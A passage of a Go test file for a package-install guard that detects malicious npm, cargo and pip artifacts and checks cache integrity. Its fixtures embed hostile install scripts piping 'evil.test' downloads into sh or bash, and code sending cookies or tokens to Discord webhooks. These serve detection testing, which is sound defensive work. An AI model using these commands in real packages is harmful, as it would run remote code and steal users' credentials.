	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "cached-evil", Version: "3.0.0"})
	if !v.Block {
		t.Fatalf("guard must block a cached malicious package with no staging dir, got %+v", v)
	}
}

func TestCargoCacheArtifactBytes(t *testing.T) {
	crate := makeTGZ(t, map[string]string{
		"cached-crate-2.0.0/Cargo.toml": "[package]\nname = \"cached-crate\"\nversion = \"2.0.0\"\nbuild = \"build.rs\"\n",
		"cached-crate-2.0.0/build.rs":   "fn main() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl https://evil.test/x.sh | sh\").status().unwrap(); }\n",
	})
	home := t.TempDir()
	// Cargo stages the download at registry/cache/<registry-hash>/<name>-<ver>.crate.
	cacheDir := filepath.Join(home, "registry", "cache", "github.com-1ecc6299db9ec823")
	if err := os.MkdirAll(cacheDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(cacheDir, "cached-crate-2.0.0.crate"), crate, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CARGO_HOME", home)
	t.Setenv(guardArtifactDirEnv, "") // force the cache path, not the staged dir

	got, _ := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "cached-crate", Version: "2.0.0"})
	if !bytes.Equal(got, crate) {
		t.Fatalf("cargo cache read returned %d bytes, want the staged %d", len(got), len(crate))
	}
	// Unpinned -> nil (fail-open).
	if b, _ := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "cached-crate"}); b != nil {
		t.Errorf("unpinned spec must not resolve from cache, got %d bytes", len(b))
	}
	// Missing crate -> nil.
	if b, _ := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "absent", Version: "9.9.9"}); b != nil {
		t.Errorf("missing crate must return nil, got %d bytes", len(b))
	}
	// Missing CARGO_HOME dir -> nil (fail-open).
	t.Setenv("CARGO_HOME", filepath.Join(home, "does-not-exist"))
	if b, _ := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "cached-crate", Version: "2.0.0"}); b != nil {
		t.Errorf("missing cargo cache dir must return nil, got %d bytes", len(b))
	}
	t.Setenv("CARGO_HOME", home)

	// And the guard blocks it end-to-end via the cache, no staging dir.
	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "cargo", Name: "cached-crate", Version: "2.0.0"})
	if !v.Block {
		t.Fatalf("guard must block a cached malicious crate with no staging dir, got %+v", v)
	}
}

func TestPipCacheArtifactBytes(t *testing.T) {
	// A wheel is a zip; analyzeArtifact("pip", …) reads its source bodies. Embed
	// a Discord webhook in a module so the IOC scan blocks (wheels lack setup.py,
	// so the install-script detector never fires — this is the coverage a
	// wheel-cache hit adds).
	whl := makeZip(t, map[string]string{
		"cached_pkg/__init__.py": "import requests\nrequests.post('https://discord.com/api/webhooks/123/abc', data=open('cookies.sqlite','rb').read())\n",
	})
	root := t.TempDir()
	// pip sards wheels under wheels/<a>/<b>/<c>/<hash>/<file>.whl.
	wheelDir := filepath.Join(root, "wheels", "a", "b", "c", "0123456789abcdef")
	if err := os.MkdirAll(wheelDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(wheelDir, "cached_pkg-1.2.3-py3-none-any.whl"), whl, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PIP_CACHE_DIR", root)
	t.Setenv(guardArtifactDirEnv, "") // force the cache path, not the staged dir

	// Name given with a dash resolves via PEP 503 normalization to the underscore
	// wheel filename.
	got, _ := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "cached-pkg", Version: "1.2.3"})
	if !bytes.Equal(got, whl) {
		t.Fatalf("pip cache read returned %d bytes, want the staged %d", len(got), len(whl))
	}
	// Unpinned -> nil (fail-open).
	if b, _ := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "cached-pkg"}); b != nil {
		t.Errorf("unpinned spec must not resolve from cache, got %d bytes", len(b))
	}
	// Missing wheel -> nil.
	if b, _ := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "absent", Version: "9.9.9"}); b != nil {
		t.Errorf("missing wheel must return nil, got %d bytes", len(b))
	}
	// Missing cache dir -> nil (fail-open).
	t.Setenv("PIP_CACHE_DIR", filepath.Join(root, "does-not-exist"))
	if b, _ := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "cached-pkg", Version: "1.2.3"}); b != nil {
		t.Errorf("missing pip cache dir must return nil, got %d bytes", len(b))
	}
	t.Setenv("PIP_CACHE_DIR", root)

	// And the guard blocks it end-to-end via the cache, no staging dir.
	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "pip", Name: "cached-pkg", Version: "1.2.3"})
	if !v.Block {
		t.Fatalf("guard must block a cached malicious wheel with no staging dir, got %+v", v)
	}
}

// TestGuardCacheIndexIsScannedOncePerProcess pins the 2026-08-24 redesign, and
// with it the fix for the defect the old design produced.
//
// OLD: the fallback re-walked the entire cacache tree on every spec that missed
// the O(1) lookup, bounded by a shared 4096-file / 250ms budget. One real
// ~/.npm/_cacache (9,859 index files) costs 250ms to read COMPLETELY, so the
// first walk spent the whole process budget and every later spec reported
// acquireIncomplete — measured at INCOMPLETE:31 OK:59 over the first 90 entries
// of a real 924-package package-lock.json. Harmless while acquireIncomplete was
// inert; a third of an honest install marked "signals unavailable" once it fed
// input.signalsUnavailable.
//
// NEW: the tree is scanned ONCE per process (dirIndex) and every later spec is
// a map lookup. This test asserts both halves — the scan happens once, and a
// COMPLETE scan turns "not in the cache" into a PROVEN acquireMiss rather than
// an unproven acquireIncomplete.
func TestGuardCacheIndexIsScannedOncePerProcess(t *testing.T) {
	// A synthetic cacache with a substantial index. Entries are keyed on a
	// NON-default registry so the O(1) shard lookup can never resolve them —
	// only the fallback index can, which is the path under test.
	root := t.TempDir()
	indexDir := filepath.Join(root, "_cacache", "index-v5")
	const shards = 48
	const perShard = 120 // 5,760 index files: more than the OLD 4096 cap
	for i := 0; i < shards; i++ {
		d := filepath.Join(indexDir, fmt.Sprintf("%02x", i), "ab")
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		for j := 0; j < perShard; j++ {
			key := fmt.Sprintf("make-fetch-happen:request-cache:http://registry.internal:4873/filler%d-%d/-/filler%d-%d-1.0.0.tgz", i, j, i, j)
			line := fmt.Sprintf("deadbeef\t{\"key\":%q,\"integrity\":\"sha512-nope\"}\n", key)
			if err := os.WriteFile(filepath.Join(d, fmt.Sprintf("e%d", j)), []byte(line), 0o644); err != nil {
				t.Fatal(err)
			}
		}
	}
	t.Setenv("npm_config_cache", root)
	t.Setenv(guardArtifactDirEnv, "")

	resetGuardCacheIndexesForTest()
	t.Cleanup(resetGuardCacheIndexesForTest)

	const specs = 40
	for i := 0; i < specs; i++ {
		// Every one of these misses the O(1) lookup and falls through to the
		// index — the exact shape of a fresh `npm ci` against a private registry.
		_, res := npmCacheArtifactBytes(packageSpec{
			Ecosystem: "npm",
			Name:      fmt.Sprintf("absent-pkg-%d", i),
			Version:   "1.0.0",
		})
		// THE REGRESSION THIS TEST EXISTS FOR. Under the old design spec #1
		// exhausted the budget and #2..#40 reported acquireIncomplete on a
		// cache that demonstrably does not contain them. A completed scan
		// PROVES absence, so every one of these is a plain miss.
		if res != acquireMiss {
			t.Fatalf("spec #%d against a fully-scanned cache: want acquireMiss, got %v — an absent package on a complete index is not a degraded analysis", i, res)
		}
	}

	// The scan happened exactly once: 40 specs read one tree's worth of files,
	// not forty. (A per-spec re-walk would be 40 x 5,760 = 230,400.)
	if got := guardCacheWalk.files(); got != shards*perShard {
		t.Fatalf("%d specs read %d index files; one complete scan of this fixture is %d — the scan is not memoized",
			specs, got, shards*perShard)
	}
	// And it is well inside the shared allowance, so nothing was truncated.
	if guardCacheWalk.exhausted() {
		t.Fatalf("a %d-file cache must not exhaust a %d-file / %v budget", shards*perShard, guardCacheWalkMaxFiles, guardCacheWalkDeadline)
	}
	// A real hit resolves from the same memoized index, with no further reads.
	before := guardCacheWalk.files()
	got, res := findNpmCacheIntegrity(indexDir, "filler0-0", "filler0-0-1.0.0.tgz")
	if got != "sha512-nope" || res != acquireOK {
		t.Fatalf("the memoized index must resolve a present entry, got (%q, %v)", got, res)
	}
	if after := guardCacheWalk.files(); after != before {
		t.Fatalf("a lookup against the memoized index re-read %d files; it must read none", after-before)
	}
	// The other half of the split, still intact: a TRUNCATED index cannot
	// prove absence, so it reports acquireIncomplete. That is the distinction
	// stopping budget exhaustion from buying the same silence as an uncached
	// package; see acquireResult in guard_artifact.go.
	resetGuardCacheIndexesForTest()
	guardCacheWalk.exhaustForTest()
	got, res = findNpmCacheIntegrity(indexDir, "filler0-0", "filler0-0-1.0.0.tgz")
	if got != "" || res != acquireIncomplete {
		t.Fatalf("an exhausted budget must report (\"\", acquireIncomplete); got (%q, %v) — a truncated scan is not a miss", got, res)
	}
}

// TestNpmCacheFallbackMatchesThePackageNotTheFilename is BLOCKER 3: the
// fallback matched on the tarball BASENAME only, so it happily returned a
// DIFFERENT package's bytes.
//
// Reproduced against a real ~/.npm/_cacache, the guard asked for
// @attacker/lodash@4.17.21 and got 318,961 bytes of the genuine unscoped
// lodash, reported acquireOK, and ran the behavioral detectors over a popular
// clean package while npm installed the attacker's. With a lockfile anchor
// present the same collision does the inverse and manufactures a FALSE
// acquireDigestMismatch on a clean install.
//
// Ten such collisions exist on that cache (@types/react-dom vs react-dom,
// @types/pg vs pg, four d3-* pairs, …) and which one won was filesystem-order
// dependent. Note that adding the scope to a SUFFIX match does not fix it:
// "/react-dom/-/react-dom-1.0.0.tgz" is a suffix of
// "/@types/react-dom/-/react-dom-1.0.0.tgz".
func TestNpmCacheFallbackMatchesThePackageNotTheFilename(t *testing.T) {
	real := makeTGZ(t, map[string]string{"package/package.json": `{"name":"lodash","version":"4.17.21"}`})

	// A cacache holding ONLY the genuine unscoped lodash, keyed on a
	// non-default registry so nothing can resolve via the O(1) fast path.
	root := t.TempDir()
	indexDir := filepath.Join(root, "_cacache", "index-v5", "aa", "bb")
	if err := os.MkdirAll(indexDir, 0o755); err != nil {
		t.Fatal(err)
	}
	sum := sha512.Sum512(real)
	sri := "sha512-" + base64.StdEncoding.EncodeToString(sum[:])
	key := "make-fetch-happen:request-cache:http://registry.internal:4873/lodash/-/lodash-4.17.21.tgz"
	line := fmt.Sprintf("deadbeef\t{\"key\":%q,\"integrity\":%q}\n", key, sri)
	if err := os.WriteFile(filepath.Join(indexDir, "e0"), []byte(line), 0o644); err != nil {
		t.Fatal(err)
	}
	h := hex.EncodeToString(sum[:])
	contentDir := filepath.Join(root, "_cacache", "content-v2", "sha512", h[0:2], h[2:4])
	if err := os.MkdirAll(contentDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(contentDir, h[4:]), real, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("npm_config_cache", root)
	t.Setenv(guardArtifactDirEnv, "")

	// The control: the genuine coordinate still resolves. Without this half the
	// assertion below would pass on a matcher that never matches anything.
	resetGuardCacheIndexesForTest()
	t.Cleanup(resetGuardCacheIndexesForTest)
	if b, res := npmCacheArtifactBytes(packageSpec{Ecosystem: "npm", Name: "lodash", Version: "4.17.21"}); !bytes.Equal(b, real) || res != acquireOK {
		t.Fatalf("the genuine coordinate must still resolve through the fallback index, got (%d bytes, %v)", len(b), res)
	}

	// THE DEFECT. A scoped impostor whose last path segment collides.
	resetGuardCacheIndexesForTest()
	b, res := npmCacheArtifactBytes(packageSpec{Ecosystem: "npm", Name: "@attacker/lodash", Version: "4.17.21"})
	if len(b) != 0 {
		t.Fatalf("@attacker/lodash resolved to %d bytes — the guard analyzed a DIFFERENT package's tarball, a false ALLOW in the behavioral lane", len(b))
	}
	if res != acquireMiss {
		t.Fatalf("@attacker/lodash against a complete index: want acquireMiss, got %v", res)
	}

	// The @types/<name> vs <name> shape, which a scope-aware SUFFIX match would
	// still get wrong in the other direction.
	resetGuardCacheIndexesForTest()
	if b, res := npmCacheArtifactBytes(packageSpec{Ecosystem: "npm", Name: "@types/lodash", Version: "4.17.21"}); len(b) != 0 || res != acquireMiss {
		t.Fatalf("@types/lodash must not resolve to the unscoped lodash tarball, got (%d bytes, %v)", len(b), res)
	}
}

// TestNpmTarballCoordinate pins the decomposition the match depends on,
// including the registry-path-prefix case (Artifactory/Nexus) that is the whole
// reason the fallback index exists and that an exact full-path comparison would
// break.
func TestNpmTarballCoordinate(t *testing.T) {
	cases := []struct {
		path, name, file string
		ok               bool
	}{
		{"/lodash/-/lodash-4.17.21.tgz", "lodash", "lodash-4.17.21.tgz", true},
		{"/@types/react-dom/-/react-dom-19.0.0.tgz", "@types/react-dom", "react-dom-19.0.0.tgz", true},
		{"/api/npm/npm-remote/lodash/-/lodash-4.17.21.tgz", "lodash", "lodash-4.17.21.tgz", true},
		{"/api/npm/npm-remote/@types/pg/-/pg-8.11.0.tgz", "@types/pg", "pg-8.11.0.tgz", true},
		{"/lodash", "", "", false},
		{"/lodash/-/", "", "", false},
		{"/lodash/-/a/b.tgz", "", "", false},
	}
	for _, c := range cases {
		name, file, ok := npmTarballCoordinate(c.path)
		if ok != c.ok || name != c.name || file != c.file {
			t.Errorf("npmTarballCoordinate(%q) = (%q, %q, %v), want (%q, %q, %v)", c.path, name, file, ok, c.name, c.file, c.ok)
		}
	}
}

// TestAcquireResult_MissVsIncomplete pins the split that the whole type exists
// for: a package that is simply not cached reports acquireMiss, while the same
// lookup under an exhausted walk budget reports acquireIncomplete. Before the
// split both returned a bare nil and the call site could not tell them apart —
// which made budget exhaustion a silent-ALLOW primitive.
func TestAcquireResult_MissVsIncomplete(t *testing.T) {
	npmCache := t.TempDir()
	t.Setenv("npm_config_cache", npmCache)
	// npmCacacheDir resolves <npm_config_cache>/_cacache, not the bare dir.
	cacache := filepath.Join(npmCache, "_cacache")
	if err := os.MkdirAll(filepath.Join(cacache, "index-v5"), 0o755); err != nil {
		t.Fatal(err)
	}
	resetGuardCacheIndexesForTest()
	t.Cleanup(resetGuardCacheIndexesForTest)

	spec := packageSpec{Ecosystem: "npm", Name: "not-cached", Version: "1.0.0"}

	// Fresh budget, empty index: a genuine miss.
	if b, res := npmCacheArtifactBytes(spec); len(b) != 0 || res != acquireMiss {
		t.Fatalf("uncached package with a fresh budget: want (nil, acquireMiss), got (%d bytes, %v)", len(b), res)
	}

	// Same lookup, budget spent before the index could be built: the scan
	// cannot prove absence. (The index is dropped first so the lookup has to
	// rebuild it and therefore has to consult the budget.)
	resetGuardCacheIndexesForTest()
	guardCacheWalk.exhaustForTest()
	if b, res := npmCacheArtifactBytes(spec); len(b) != 0 || res != acquireIncomplete {
		t.Fatalf("uncached package with an exhausted budget: want (nil, acquireIncomplete), got (%d bytes, %v)", len(b), res)
	}

	// Wrong ecosystem is always a miss — never attacker-influenceable.
	resetGuardCacheIndexesForTest()
	if b, res := cargoCacheArtifactBytes(spec); len(b) != 0 || res != acquireMiss {
		t.Fatalf("npm spec against the cargo source: want (nil, acquireMiss), got (%d bytes, %v)", len(b), res)
	}

	// A corrupt integrity string resolved from the index is incomplete, not a
	// miss: npm has bytes it intends to install and the guard cannot read them.
	if b, res := readCacacheContent(cacache, "sha512-!!!not-base64!!!", ""); len(b) != 0 || res != acquireIncomplete {
		t.Fatalf("corrupt integrity: want (nil, acquireIncomplete), got (%d bytes, %v)", len(b), res)
	}

	// The algo segment of an index integrity string becomes a path component,
	// and the index is exactly what this function's threat model assumes the
	// attacker can write. A traversal shape must not resolve into a read.
	//
	// The target file is REAL and placed exactly where the traversal would
	// land it, so this assertion discriminates: without the algo allowlist the
	// read succeeds and the call returns the foreign bytes' verdict instead of
	// acquireIncomplete.
	outside := filepath.Join(npmCache, "outside")
	// hex("abcdef") = 616263646566, i.e. shard 61/62 + name 63646566.
	if err := os.MkdirAll(filepath.Join(outside, "61", "62"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(outside, "61", "62", "63646566"), []byte("not a package"), 0o644); err != nil {
		t.Fatal(err)
	}
	traversal := "../../outside-YWJjZGVm" // algo "../../outside", digest "abcdef"
	if b, res := readCacacheContent(cacache, traversal, ""); len(b) != 0 || res != acquireIncomplete {
		t.Fatalf("path-traversal algo: want (nil, acquireIncomplete), got (%d bytes, %v)", len(b), res)
	}
}

func TestAnalyzeArtifact_EmbeddedIOCHost(t *testing.T) {
	// A JS source embedding a Discord webhook exfil sink — an in-no-feed IOC the
	// name lookup can never catch. Cross-ecosystem: the IOC scan runs regardless
	// of the manifest.
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"looks-fine","version":"1.0.0"}`,
		"package/index.js":     "fetch('https://discord.com/api/webhooks/999/deadbeef', {method:'POST', body: process.env.TOKEN});\n",
	})
	v := analyzeArtifact("npm", tgz)
	if !v.Block {
		t.Fatalf("expected BLOCK for embedded exfil-webhook IOC, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
	if !strings.Contains(v.Reason, "malicious indicator") {
		t.Errorf("reason = %q, want it to mention the malicious indicator", v.Reason)
	}
}

func TestAnalyzeArtifact_BenignSourceNoIOC(t *testing.T) {
	// Ordinary source that fetches from a legitimate CDN must NOT trip the IOC
	// scan — the false-positive guard.
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"benign","version":"1.0.0"}`,
		"package/index.js":     "const x = require('lodash');\nfetch('https://registry.npmjs.org/lodash');\nmodule.exports = x;\n",
	})
	if v := analyzeArtifact("npm", tgz); v.Block {
		t.Fatalf("benign source must not block on the IOC scan, got %+v", v)
	}
}

func TestFetchArtifactBytes_DeepMode(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"net-evil","version":"4.0.0","scripts":{"postinstall":"curl https://evil.test/x | sh"}}`,
	})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/net-evil/-/net-evil-4.0.0.tgz" {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(tgz)
	}))
	defer srv.Close()
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir()) // isolate the egress-audit write
	t.Setenv(guardNpmRegistryEnv, srv.URL)
	spec := packageSpec{Ecosystem: "npm", Name: "net-evil", Version: "4.0.0"}

	// Off by default: no network, no bytes — the offline guarantee holds.
	t.Setenv(guardDeepFetchEnv, "")
	if b, _ := fetchArtifactBytes(spec); b != nil {
		t.Fatalf("deep mode off must return nil (offline), got %d bytes", len(b))
	}

	// On: fetches the pinned tarball and the analyzer blocks it.
	t.Setenv(guardDeepFetchEnv, "1")
	got, _ := fetchArtifactBytes(spec)
	if !bytes.Equal(got, tgz) {
		t.Fatalf("deep fetch returned %d bytes, want %d", len(got), len(tgz))
	}
	if v := analyzeArtifact("npm", got); !v.Block {
		t.Fatalf("fetched malware must block, got %+v", v)
	}
	// Unpinned never fetches (URL not deterministic).
	if b, _ := fetchArtifactBytes(packageSpec{Ecosystem: "npm", Name: "net-evil"}); b != nil {
		t.Fatalf("unpinned spec must not fetch, got %d bytes", len(b))
	}
}

func TestEvaluate_DeepFetchBlock_Integration(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"deep-evil","version":"1.0.0","scripts":{"preinstall":"wget http://evil.test/d -O- | bash"}}`,
	})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/deep-evil/-/deep-evil-1.0.0.tgz" {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(tgz)
	}))
	defer srv.Close()
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir()) // isolate the egress-audit write
	t.Setenv(guardDeepFetchEnv, "1")
	t.Setenv(guardNpmRegistryEnv, srv.URL)
	t.Setenv(guardArtifactDirEnv, "")         // no staged dir
	t.Setenv("npm_config_cache", t.TempDir()) // empty cache -> miss fast, force the fetch

	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "deep-evil", Version: "1.0.0"})
	if !v.Block {
		t.Fatalf("deep mode must block a fetched malicious package, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
}

func TestEvaluate_BehavioralBlock_Integration(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "npm"), 0o755); err != nil {
		t.Fatal(err)
	}
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"2.0.0","scripts":{"preinstall":"wget http://evil.test/dropper -O- | bash"}}`,
	})
	if err := os.WriteFile(filepath.Join(dir, "npm", "evil-2.0.0.tgz"), tgz, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv(guardArtifactDirEnv, dir)

	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "evil", Version: "2.0.0"})
	if !v.Block {
		t.Fatalf("guard must BLOCK a staged package with a remote-fetch install script, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
}

// TestGuardEndToEnd_DigestMismatchWarnsAndCounts is the whole change stated as
// one behaviour: a tampered npm cache produces a VISIBLE degraded signal and an
// install that still proceeds.
//
// The non-block half is the load-bearing assertion. Per the 2026-08-24 ruling
// in docs/plan_competitive_depth.md, warn-vs-block on a degraded analysis is a
// policy decision — the built-in bundle answers monitor and an operator bundle
// answers block. A hardcoded refusal here would be the per-surface hardcoding
// the acquireResult split exists to prevent, and it would hard-fail installs on
// any machine whose cache legitimately disagrees with a stale lockfile.
func TestGuardEndToEnd_DigestMismatchWarnsAndCounts(t *testing.T) {
	guardPolicyResetForTest()
	t.Cleanup(guardPolicyResetForTest)
	t.Setenv(guardPolicyBundleEnv, "")
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir())

	evil := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"e2e-swapped","version":"1.0.0","scripts":{"postinstall":"curl https://evil.test/x | sh"}}`,
	})
	benign := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"e2e-swapped","version":"1.0.0"}`,
	})
	root := writeNpmCacheFixture(t, npmCacheFixture{
		Name: "e2e-swapped", Version: "1.0.0", Address: evil, Stored: benign,
	})
	t.Setenv("npm_config_cache", root)
	t.Setenv(guardArtifactDirEnv, "")
	resetGuardCacheIndexesForTest()
	t.Cleanup(resetGuardCacheIndexesForTest)

	beforeMismatch := GuardDigestMismatchCount()
	beforeDegraded := GuardAnalysisIncompleteCount()

	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "e2e-swapped", Version: "1.0.0"})

	if v.Block {
		t.Fatalf("a digest mismatch must NOT hard-block under the built-in bundle — that is a policy decision; got %+v", v)
	}
	if v.Severity != guardSeverityPolicy {
		t.Fatalf("a digest mismatch must surface as a policy verdict the user can see, got severity %q (%+v)", v.Severity, v)
	}
	if got := GuardDigestMismatchCount(); got != beforeMismatch+1 {
		t.Fatalf("GuardDigestMismatchCount = %d, want %d — the mismatch is invisible in aggregate", got, beforeMismatch+1)
	}
	if got := GuardAnalysisIncompleteCount(); got != beforeDegraded+1 {
		t.Fatalf("GuardAnalysisIncompleteCount = %d, want %d — a mismatch is also a degraded analysis", got, beforeDegraded+1)
	}
}

// TestVerifySRI_MalformedStrongEntryCannotBeDowngraded is S4. The single-pass
// version raised `best` only AFTER a successful base64 decode, so a corrupted
// strong entry was skipped entirely and a weak entry beside it decided the
// verdict — the exact downgrade the "strongest present decides" rule exists to
// prevent, on a string (npm's own index integrity) this file's threat model
// assumes the attacker can write.
func TestVerifySRI_MalformedStrongEntryCannotBeDowngraded(t *testing.T) {
	data := []byte("the bytes")
	weak := sha1.Sum(data)
	weakSRI := "sha1-" + base64.StdEncoding.EncodeToString(weak[:])

	checked, ok := verifySRI(data, "sha512-@@@notbase64@@@ "+weakSRI)
	if ok {
		t.Fatal("a malformed sha512 entry must not hand the decision to a matching sha1 entry — that is a downgrade")
	}
	if checked {
		t.Fatalf("no well-formed entry at the strongest named algorithm means CANNOT CHECK, got checked=%v", checked)
	}

	// The control: with the sha512 entry well-formed and matching, the same
	// input verifies. Without this half the assertion above would pass on a
	// verifySRI that always answered "cannot check".
	strong := sha512.Sum512(data)
	strongSRI := "sha512-" + base64.StdEncoding.EncodeToString(strong[:])
	if checked, ok := verifySRI(data, strongSRI+" "+weakSRI); !checked || !ok {
		t.Fatalf("a well-formed matching sha512 entry must verify, got (checked=%v, ok=%v)", checked, ok)
	}
	// And a well-formed NON-matching strong entry is still a real failure.
	other := sha512.Sum512([]byte("different bytes"))
	if checked, ok := verifySRI(data, "sha512-"+base64.StdEncoding.EncodeToString(other[:])+" "+weakSRI); !checked || ok {
		t.Fatalf("a well-formed mismatching sha512 entry must fail, got (checked=%v, ok=%v)", checked, ok)
	}
}

// TestVerifySRI_TruncatedDigestIsCannotCheckNotMismatch is S3. `best` used to
// be raised before the digest LENGTH was validated, so a truncated or otherwise
// malformed lockfile digest returned checked=true / ok=false — a manufactured
// acquireDigestMismatch on bytes nobody tampered with. The checked/ok split
// exists precisely to keep "I could not check" apart from "it did not match".
func TestVerifySRI_TruncatedDigestIsCannotCheckNotMismatch(t *testing.T) {
	data := []byte("the bytes")
	sum := sha512.Sum512(data)
	truncated := "sha512-" + base64.StdEncoding.EncodeToString(sum[:10]) // 10 of 64 bytes

	checked, ok := verifySRI(data, truncated)
	if checked {
		t.Fatalf("a digest of the wrong length is unverifiable, not a mismatch: got (checked=%v, ok=%v)", checked, ok)
	}
	// A degraded-acquisition report must therefore NOT be manufactured.
	if checked && !ok {
		t.Fatal("a malformed anchor must never produce acquireDigestMismatch")
	}
	// Empty and unknown-algorithm inputs stay "cannot check" too.
	if c, _ := verifySRI(data, ""); c {
		t.Fatal("an empty SRI string is not checkable")
	}
	if c, _ := verifySRI(data, "md5-abcd"); c {
		t.Fatal("an algorithm this build cannot recompute is not checkable")
	}
}

// TestReadCacacheContentToleratesSRIOptions is S2. cacache and npm both emit
// "sha512-<b64>?size=…", and readCacacheContent used a bare strings.Cut, so the
// "?size=21" rode into the base64 decoder, failed, and turned an ordinary cache
// entry into acquireIncomplete — a FALSE degraded signal, on an honest install,
// which builtin.rego then reports and a fail-closed operator refuses.
// verifySRI in the same commit stripped it; the two disagreed.
func TestReadCacacheContentToleratesSRIOptions(t *testing.T) {
	payload := []byte("some tarball bytes")
	sum := sha512.Sum512(payload)
	b64 := base64.StdEncoding.EncodeToString(sum[:])
	h := hex.EncodeToString(sum[:])

	cacache := t.TempDir()
	dir := filepath.Join(cacache, "content-v2", "sha512", h[0:2], h[2:4])
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, h[4:]), payload, 0o644); err != nil {
		t.Fatal(err)
	}

	withOpts := fmt.Sprintf("sha512-%s?size=%d", b64, len(payload))
	b, res := readCacacheContent(cacache, withOpts, "")
	if res != acquireOK || !bytes.Equal(b, payload) {
		t.Fatalf("an SRI string carrying ?opts must resolve normally, got (%d bytes, %v)", len(b), res)
	}
	// The same on the lockfile-anchor argument.
	if b, res := readCacacheContent(cacache, "sha512-"+b64, withOpts); res != acquireOK || !bytes.Equal(b, payload) {
		t.Fatalf("a lockfile anchor carrying ?opts must resolve normally, got (%d bytes, %v)", len(b), res)
	}
}

// TestReadCacacheContentAlgoCaseIsPlatformStable pins the other half of the
// same edit: the content PATH was built from the un-lowercased algorithm while
// the allowlist check lowercased it, so "SHA512-…" resolved on
// case-insensitive macOS and reported acquireIncomplete on Linux. The same
// cache produced different verdicts per platform — and on the fail-closed
// posture builtin.rego documents, a different INSTALL OUTCOME.
func TestReadCacacheContentAlgoCaseIsPlatformStable(t *testing.T) {
	payload := []byte("case stable bytes")
	sum := sha512.Sum512(payload)
	b64 := base64.StdEncoding.EncodeToString(sum[:])
	h := hex.EncodeToString(sum[:])

	cacache := t.TempDir()
	// Written at the canonical LOWERCASE path, which is what cacache uses.
	dir := filepath.Join(cacache, "content-v2", "sha512", h[0:2], h[2:4])
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, h[4:]), payload, 0o644); err != nil {
		t.Fatal(err)
	}
	b, res := readCacacheContent(cacache, "SHA512-"+b64, "")
	if res != acquireOK || !bytes.Equal(b, payload) {
		t.Fatalf("an uppercased algorithm must resolve identically on every platform, got (%d bytes, %v)", len(b), res)
	}
}

// TestLocalArtifactBytesHonoursTheLockfileAnchor is S5. The staged-artifact
// source is tried FIRST and consulted spec.Integrity not at all, so on a
// lockfile-driven install it was the one byte source that could hand the
// analyzer un-anchored bytes — making "anchor analyzed bytes to the lockfile"
// broader as a claim than as an implementation.
//
// The realistic failure is not an attack: an operator stages 4.17.20, the
// lockfile pins 4.17.21, and the guard silently reports acquireOK on an
// analysis of the wrong artifact.
func TestLocalArtifactBytesHonoursTheLockfileAnchor(t *testing.T) {
	staged := makeTGZ(t, map[string]string{"package/package.json": `{"name":"staged","version":"1.0.0"}`})
	other := makeTGZ(t, map[string]string{"package/package.json": `{"name":"staged","version":"1.0.0","description":"what the lockfile actually pins"}`})

	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "npm"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "npm", "staged-1.0.0.tgz"), staged, 0o644); err != nil {
		t.Fatal(err)
	}
